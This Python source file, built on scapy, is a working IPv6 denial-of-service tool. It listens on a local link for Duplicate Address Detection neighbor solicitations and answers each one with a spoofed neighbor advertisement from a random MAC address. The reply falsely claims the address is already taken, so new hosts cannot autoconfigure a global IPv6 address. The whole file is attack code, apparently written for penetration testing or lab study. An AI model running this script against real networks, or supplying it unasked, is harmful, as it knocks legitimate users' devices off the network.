#!/usr/bin/python3
import argparse
import random
import sys
from collections import Counter

import netifaces
from scapy.layers.inet6 import ICMPv6ND_NS, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
from scapy.layers.l2 import Ether
from scapy.sendrecv import sniff, sendp


def main():
    parser = argparse.ArgumentParser(description="Preventing every host on the local link from autoconfiguring its "
                                                 "global IPv6 address.")
    parser.add_argument("interface", nargs="?", help="the network interface to use from the sender")
    args = parser.parse_args()

    # Validate the input
    if len(sys.argv) <= 1:
        parser.print_help()
        sys.exit(1)

    # Validate the network interface
    if not args.interface:
        print("---> Network interface is required!!!")
        parser.print_help()
        sys.exit(1)
    interface_list = netifaces.interfaces()
    while True:
        if args.interface in interface_list:
            break
        else:
            print("---> The given interface is invalid. Try again!!!")
            sys.exit(1)

    # Define our Custom Action function
    packet_counts = Counter()

    def custom_action(packet):
        # Create tuple of Src/Dst in sorted order
        if packet[0][1].src == "::":
            key = tuple(sorted([packet[0][1].src, packet[0][1].dst]))
            packet_counts.update([key])
            # Generating packet
            random_mac = "02:03:00:%02x:%02x:%02x" % (random.randint(0, 255),
                                                      random.randint(0, 255),
                                                      random.randint(0, 255))
            layer2 = Ether(src=random_mac)
            layer3 = IPv6(src=packet[0][ICMPv6ND_NS].tgt, dst="ff02::1")
            packet1 = layer2 / layer3 / ICMPv6ND_NA(O=1, tgt=packet[0][ICMPv6ND_NS].tgt) / ICMPv6NDOptDstLLAddr(
                lladdr=random_mac)
            sendp(packet1, verbose=False, iface=args.interface)
            return f"Preventing a host number #{sum(packet_counts.values())} from getting address: " \
                   f"{packet[0][ICMPv6ND_NS].tgt}"

    # Setup sniff, filtering for IP traffic to see the result
    print("Initializing to prevent new IPv6 hosts on the local link from autoconfiguring global IPv6 address ("
          "press Ctrl+C to stop the process).....")
    build_filter = "icmp6 and  ip6[40] == 135"

    try:
        sniff(iface=args.interface, filter=build_filter, prn=custom_action)
    except KeyboardInterrupt:
        sys.exit(0)


if __name__ == "__main__":
    main()
